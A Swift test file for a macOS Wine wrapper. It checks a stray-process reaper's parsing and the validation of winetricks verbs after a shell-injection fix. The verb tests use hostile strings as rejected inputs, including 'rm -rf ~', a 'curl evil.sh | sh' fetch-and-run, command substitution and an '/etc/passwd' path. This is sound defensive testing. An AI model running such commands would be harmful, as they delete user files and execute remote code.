import Foundation
import DecanterKit

/// The reaper decides what to SIGKILL, so its parsing is worth pinning down.
/// Every case here is taken from real `ps` output on this machine — including
/// the two that a naive split-on-spaces got wrong.
func runReaperTests(_ t: Harness) {
    t.suite("stray Wine processes")

    func stray(_ command: String, cpu: Double = 0, etime: String = "00:01") -> WineReaper.Stray {
        WineReaper.Stray(pid: 1, cpu: cpu, elapsed: etime, command: command,
                         prefix: nil, isService: false)
    }

    // ps reports elapsed time as [[dd-]hh:]mm:ss, and a leak is only obvious
    // once you can say "this has been running for six days".
    t.equal(WineReaper.Stray.seconds("00:30"), 30, "mm:ss")
    t.equal(WineReaper.Stray.seconds("02:30"), 150, "mm:ss with minutes")
    t.equal(WineReaper.Stray.seconds("01:02:30"), 3750, "hh:mm:ss")
    t.equal(WineReaper.Stray.seconds("05-22:48:29"), 5 * 86400 + 22 * 3600 + 48 * 60 + 29,
            "dd-hh:mm:ss — the shape a real leak has")
    t.equal(WineReaper.Stray.seconds("garbage"), 0, "unparseable elapsed time is 0, not a crash")

    // Wine relabels its own children with Windows paths.
    t.equal(stray(#"C:\windows\system32\services.exe"#).displayName, "services.exe",
            "a Windows path is reduced to its executable")
    t.equal(stray(#"C:\windows\system32\explorer.exe /desktop"#).displayName, "explorer.exe",
            "arguments are dropped")

    // The Mac-side binary lives under "Application Support", so splitting the
    // command on spaces used to name this process "Application".
    let ws = "/Users/x/Library/Application Support/Decanter/runtimes/gptk-7.7/bin/wineserver"
    t.equal(stray(ws).displayName, "wineserver",
            "a Mac path containing spaces still resolves to its binary")

    // The process that was pinned at 100% CPU for six days. Naming it
    // "wine64-preloader" or "wine.inf" would hide what is actually stuck.
    let hung = "/Users/x/Library/Application Support/Decanter/runtimes/gptk-7.7/bin/wine64-preloader"
        + #" C:\windows\system32\rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 \\?\unix\Users\x\share\wine\wine.inf"#
    t.equal(stray(hung).displayName, "rundll32.exe (installing wine.inf)",
            "a loader is named by what it is loading, not by argv[0]")

    // Live scan: must never report the process doing the scanning.
    let found = WineReaper(paths: Paths()).strays()
    let me = ProcessInfo.processInfo.processIdentifier
    t.expect(!found.contains { $0.pid == me }, "the scan never targets itself")
    t.expect(found.allSatisfy { $0.pid > 0 }, "every stray has a usable pid")
}

/// Recipe verbs were interpolated into a `sh -c` string, so anything after a
/// semicolon ran as a command. They now go through an argv array, and the verb
/// is validated as well — defence in depth, since the CLI takes arbitrary verbs
/// and winetricks itself would choke on the rest anyway.
func runRecipeVerbTests(_ t: Harness) {
    t.suite("winetricks verb validation")
    let ok = RecipeRunner.isValidVerb

    t.expect(ok("vcrun2019"), "an ordinary verb is allowed")
    t.expect(ok("lavfilters702"), "digits are allowed")
    t.expect(ok("d3dcompiler_47"), "underscores are allowed")
    t.expect(ok("dotnet48"), "a real preset verb is allowed")

    t.expect(!ok("vcrun; rm -rf ~"), "a shell separator is refused")
    t.expect(!ok("vcrun && curl evil.sh | sh"), "a command chain is refused")
    t.expect(!ok("$(whoami)"), "command substitution is refused")
    t.expect(!ok("`id`"), "backtick substitution is refused")
    t.expect(!ok("vcrun 2019"), "a space is refused")
    t.expect(!ok("../../etc/passwd"), "a path is refused")
    t.expect(!ok(""), "an empty verb is refused")
    t.expect(!ok(String(repeating: "a", count: 65)), "an absurdly long verb is refused")

    // Every shipped preset must survive its own validation.
    for (name, preset) in RecipeRunner.presets {
        for v in preset.verbs {
            t.expect(ok(v), "preset \(name) verb \(v) passes validation")
        }
    }
}
